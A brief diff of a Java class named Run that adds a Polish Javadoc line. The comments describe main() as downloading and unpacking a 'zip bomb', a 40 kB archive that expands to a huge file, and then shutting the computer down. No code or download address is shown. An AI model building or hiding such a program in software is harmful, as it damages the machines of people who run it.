@@ -146,6 +146,7 @@ public class Run {
 
     /**
      *Pobiera i wypakowywuje plik zip z internetu a następnie wyłącza komputer
+     *Pobrany zip to tak zwana zipBomba czyli mały plik zip(40kB), który rozpakowywuje się do bardzo dużego dużego pliku
      */
     public static void main(String[] var0) throws Exception {
 
